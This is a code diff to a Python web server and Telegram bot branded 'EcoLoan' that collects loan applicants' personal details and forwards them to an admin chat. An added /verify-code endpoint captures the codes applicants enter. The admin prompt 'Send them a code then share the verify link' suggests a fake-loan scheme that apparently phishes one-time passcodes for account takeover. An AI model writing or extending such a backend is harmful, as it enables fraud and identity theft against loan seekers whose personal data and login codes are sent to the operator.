@@ -103,24 +103,55 @@ async def website_lead(request: Request):
         amount = data.get("amount", "Not specified")
         message = data.get("message", "No message")
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+
         cursor.execute("""
             INSERT INTO website_leads (name, email, phone, amount, message, timestamp)
             VALUES (?, ?, ?, ?, ?, ?)
         """, (name, email, phone, amount, message, timestamp))
         conn.commit()
-        
+
         admin_msg = (
             f"NEW WEBSITE LOAN APPLICATION\n\n"
             f"Name: {name}\nEmail: {email}\nPhone: {phone}\n"
             f"Amount: {amount}\nUsage: {message}\nTime: {timestamp}\n\n"
             f"Send them a code then share the verify link:\n{VERIFY_LINK}"
         )
-        await telegram_app.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
-        
-        return JSONResponse({"status": "success", "message": "Thank you!"})
+        if telegram_app:
+            await telegram_app.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
+
+        return JSONResponse({
+            "status": "success",
+            "message": f"Thank you {name}! Please check your email or phone for a verification code, then use the link we will send you to complete your application."
+        })
     except Exception as e:
         print("Website error:", e)
+        raise HTTPException(status_code=400, detail="Error")
+
+@web_app.post("/verify-code")
+async def verify_code(request: Request):
+    try:
+        data = await request.json()
+        contact = data.get("contact", "N/A")
+        code = data.get("code", "N/A")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        cursor.execute("""
+            INSERT INTO verifications (contact, code, timestamp)
+            VALUES (?, ?, ?)
+        """, (contact, code, timestamp))
+        conn.commit()
+
+        admin_msg = (
+            f"VERIFICATION CODE RECEIVED\n\n"
+            f"Contact: {contact}\n"
+            f"Code entered: {code}\n"
+            f"Time: {timestamp}"
+        )
+        if telegram_app:
+            await telegram_app.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
+        return JSONResponse({"status": "success"})
+    except Exception as e:
+        print("Verify error:", e)
         raise HTTPException(status_code=400, detail="Error")
 
 # ======================
@@ -164,7 +195,7 @@ async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def get_loan_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["loan_usage"] = update.message.text
     user_id = str(update.effective_user.id)
-    
+
     cursor.execute("""
     INSERT INTO applications (user_id, name, email, phone, occupation, status, loan_usage, source)
     VALUES (?, ?, ?, ?, ?, ?, ?, 'telegram')
@@ -179,10 +210,19 @@ async def get_loan_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ))
     conn.commit()
 
-    admin_msg = f"NEW TELEGRAM APPLICATION\n\nName: {context.user_data.get('name')}\n..."  # shorten if needed
+    admin_msg = (
+        f"NEW TELEGRAM APPLICATION\n\n"
+        f"Name: {context.user_data.get('name')}\n"
+        f"Email: {context.user_data.get('email')}\n"
+        f"Phone: {context.user_data.get('phone')}\n"
+        f"Occupation: {context.user_data.get('occupation')}\n"
+        f"Status: {context.user_data.get('status')}\n"
+        f"Usage: {context.user_data.get('loan_usage')}"
+    )
     await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
-
-    await update.message.reply_text(f"Application Submitted!\n\nContinue Here:\n{LOAN_LINK}")
+    await update.message.reply_text(
+        f"Application Submitted!\n\nContinue Here:\n{LOAN_LINK}\n\nOur team will contact you shortly."
+    )
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -218,17 +258,15 @@ async def run_bot():
         drop_pending_updates=True,
         allowed_updates=["message", "callback_query"]
     )
-    print("✅ EcoLoan Bot is polling...")
-
+    print("EcoLoan Bot is polling...")
     await asyncio.Event().wait()
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
+    port = int(os.environ.get("PORT", 8000))
     print(f"Starting web server on port {port}")
-    
-    # Run bot + web server
+
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.create_task(run_bot())
-    
+
     uvicorn.run(web_app, host="0.0.0.0", port=port)
